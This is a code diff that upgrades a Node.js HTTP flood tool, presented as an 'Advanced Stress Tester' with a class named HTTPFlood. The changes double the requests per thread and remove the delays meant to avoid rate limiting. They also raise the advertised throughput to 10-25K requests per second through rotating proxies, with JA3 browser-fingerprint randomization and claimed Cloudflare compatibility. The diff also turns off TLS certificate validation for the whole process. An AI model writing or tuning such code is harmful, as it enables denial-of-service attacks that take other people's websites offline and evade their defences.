@@ -13,13 +13,16 @@ const dns = require('dns').promises;
 const crypto = require('crypto');
 const { URL } = require('url');
 
+// Disable TLS certificate validation globally to prevent "unable to verify leaf signature" errors
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+
 const BANNER = `
 ╔══════════════════════════════════════════════════════════╗
-║    ADVANCED STRESS TESTER V6.1 - M2 OPTIMIZED           ║
+║    ADVANCED STRESS TESTER V6.2 - M2 OPTIMIZED           ║
 ║    Proxy Validation + RPS Control + CF Compatible         ║
-║    ✓ 2 Concurrent/Proxy     ✓ RPS Limiter Feature        ║
-║    ✓ 8000ms Proxy Timeout   ✓ Auto Bad Proxy Skip        ║
-║    ✓ JA3 Randomization      ✓ 5-15K RPS with Proxies     ║
+║    ✓ 2 Concurrent/Thread    ✓ RPS Limiter Feature        ║
+║    ✓ 10000ms Proxy Timeout  ✓ Auto Bad Proxy Skip        ║
+║    ✓ JA3 Randomization      ✓ 10-25K RPS with Proxies    ║
 ╚══════════════════════════════════════════════════════════╝
 `;
 
@@ -690,7 +693,7 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: SIMPLIFIED (1 request/thread, reliable)`);
+        console.log(`[*] Mode: OPTIMIZED (2 concurrent/thread, 15ms delay)`);
         console.log(`[*] JA3: Valid browser fingerprints + randomization`);
         console.log(`[*] Protocol: HTTP/1.1 (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)`);
         console.log(`[*] Connection: 256 socket pool + Keep-Alive`);
@@ -703,8 +706,8 @@ class HTTPFlood {
             }
         }
         
-        const baseRPS = config.proxies.length > 0 ? 50 : 120;
-        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 10000 : 40000));
+        const baseRPS = config.proxies.length > 0 ? 100 : 200;
+        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 25000 : 50000));
         console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()} req/s`);
         
         if (this.threads > 100) {
@@ -745,10 +748,11 @@ class HTTPFlood {
         const profile = getRandomElement(BROWSER_PROFILES);
         const useProxy = config.proxies.length > 0;
         const isHttpsTarget = this.url.startsWith('https://');
+        const concurrency = 2; // 2 concurrent requests per thread
         
         const endTime = Date.now() + this.duration * 1000;
         
-        while (this.running && Date.now() < endTime) {
+        const makeRequest = async () => {
             const startTime = Date.now();
             
             try {
@@ -776,16 +780,18 @@ class HTTPFlood {
                     if (proxyIndex !== lastProxyIndex || !cachedAgent) {
                         const proxy = config.proxies[proxyIndex];
                         // Choose agent based on target protocol, not proxy protocol
+                        const agentOptions = {
+                            rejectUnauthorized: false,
+                            keepAlive: true,
+                            keepAliveMsecs: 1000,
+                            maxSockets: 512,
+                            maxFreeSockets: 256,
+                            timeout: 10000
+                        };
+                        
                         cachedAgent = isHttpsTarget
-                            ? new HttpsProxyAgent(proxy, { 
-                                rejectUnauthorized: false,
-                                keepAlive: true,
-                                keepAliveMsecs: 1000
-                              })
-                            : new HttpProxyAgent(proxy, {
-                                keepAlive: true,
-                                keepAliveMsecs: 1000
-                              });
+                            ? new HttpsProxyAgent(proxy, agentOptions)
+                            : new HttpProxyAgent(proxy, agentOptions);
                         lastProxyIndex = proxyIndex;
                     }
                 }
@@ -837,17 +843,6 @@ class HTTPFlood {
                 
                 localCount++;
                 
-                // Add small delay between requests to avoid rate limiting
-                await new Promise(resolve => setTimeout(resolve, 50));
-                
-                if (config.maxRPS && useProxy) {
-                    const elapsed = (Date.now() - config.stats.startTime) / 1000;
-                    const currentRate = config.stats.totalRequests / elapsed;
-                    if (currentRate > config.maxRPS) {
-                        await new Promise(resolve => setTimeout(resolve, 50));
-                    }
-                }
-                
             } catch (error) {
                 const latency = Date.now() - startTime;
                 updateStats(false);
@@ -879,6 +874,30 @@ class HTTPFlood {
                     proxyIndex = (proxyIndex + 1) % config.proxies.length;
                     failCount = 0;
                     await new Promise(resolve => setTimeout(resolve, 100));
+                }
+            }
+        };
+        
+        // Run requests in batches of 2 concurrent
+        while (this.running && Date.now() < endTime) {
+            const batch = [];
+            for (let i = 0; i < concurrency; i++) {
+                if (this.running && Date.now() < endTime) {
+                    batch.push(makeRequest());
+                }
+            }
+            
+            await Promise.all(batch);
+            
+            // Small delay between batches (15ms instead of 50ms)
+            await new Promise(resolve => setTimeout(resolve, 15));
+            
+            // Check RPS limit if enabled
+            if (config.maxRPS && useProxy) {
+                const elapsed = (Date.now() - config.stats.startTime) / 1000;
+                const currentRate = config.stats.totalRequests / elapsed;
+                if (currentRate > config.maxRPS) {
+                    await new Promise(resolve => setTimeout(resolve, 30));
                 }
             }
         }
